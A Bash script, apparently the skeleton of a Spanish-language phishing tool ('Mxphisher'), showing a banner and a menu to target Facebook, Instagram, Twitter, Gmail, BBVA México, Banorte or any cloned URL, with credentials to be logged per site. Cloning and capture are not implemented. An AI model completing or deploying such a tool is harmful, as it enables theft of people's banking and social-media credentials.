#!/bin/bash

# Mxphisher - Script principal
# Autor: Falconmx1
# Solo para pruebas de seguridad autorizadas

trap ctrl_c INT
ctrl_c() {
    echo -e "\n\n[\033[31m!]\033[0m Saliendo...\n"
    exit 1
}

# Colores bien chingones
R="\033[0;31m"
G="\033[0;32m"
Y="\033[0;33m"
B="\033[0;34m"
M="\033[0;35m"
C="\033[0;36m"
W="\033[0;37m"
NC="\033[0m"

banner_mx() {
    clear
    echo -e "${R}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║      ███╗   ███╗██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗   ║"
    echo "║      ████╗ ████║╚██╗██╔╝██╔══██╗██║  ██║██║██╔════╝██║   ║"
    echo "║      ██╔████╔██║ ╚███╔╝ ██████╔╝███████║██║███████╗██║   ║"
    echo "║      ██║╚██╔╝██║ ██╔██╗ ██╔═══╝ ██╔══██║██║╚════██║╚═╝   ║"
    echo "║      ██║ ╚═╝ ██║██╔╝ ██╗██║     ██║  ██║██║███████║██╗   ║"
    echo "║      ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝   ║"
    echo -e "${G}"
    echo "║            🌵 PHISHING CON SAZÓN MEXICANO 🌮              ║"
    echo -e "${Y}"
    echo "║       [v1.0]  |  @ElMxphisher  |  #SoloParaPentesting     ║"
    echo -e "${NC}${R}╚══════════════════════════════════════════════════════════╝${NC}"
    echo -e "\n${C}[+]${W} Herramienta educativa. Úsala con madurez, brhother.\n"
}

menu_principal() {
    banner_mx
    echo -e "${Y}1${W}) Facebook"
    echo -e "${Y}2${W}) Instagram"
    echo -e "${Y}3${W}) Twitter"
    echo -e "${Y}4${W}) Gmail"
    echo -e "${Y}5${W}) BBVA México"
    echo -e "${Y}6${W}) Banorte"
    echo -e "${Y}7${W}) Clonar sitio personalizado (URL)"
    echo -e "${Y}8${W}) Salir"
    echo -ne "\n${B}➤${W} Selecciona una opción: "
    read opcion

    case $opcion in
        1) sitio="facebook"; url_base="https://facebook.com";;
        2) sitio="instagram"; url_base="https://instagram.com";;
        3) sitio="twitter"; url_base="https://twitter.com";;
        4) sitio="gmail"; url_base="https://gmail.com";;
        5) sitio="bbva"; url_base="https://www.bbva.mx";;
        6) sitio="banorte"; url_base="https://www.banorte.com";;
        7) 
            echo -ne "${B}➤${W} URL a clonar: "
            read url_base
            sitio="custom"
            ;;
        8) exit 0;;
        *) echo -e "${R}[!] Opción no válida"; sleep 1; menu_principal;;
    esac

    # Aquí llamarías a las funciones de túnel y clonado
    echo -e "\n${G}[+]${W} Preparando ataque educativo en: $sitio"
    echo -e "${Y}[!]${W} Funcionalidad completa en la siguiente versión. Por ahora, mira la estructura."
    echo -e "${C}[*]${W} Directorio creado: sites/$sitio/"
    mkdir -p "sites/$sitio"
    echo -e "${C}[*]${W} Capturas se guardarán en: logs/${sitio}_creds.log"
    sleep 3
    menu_principal
}

# Ejecutar
menu_principal
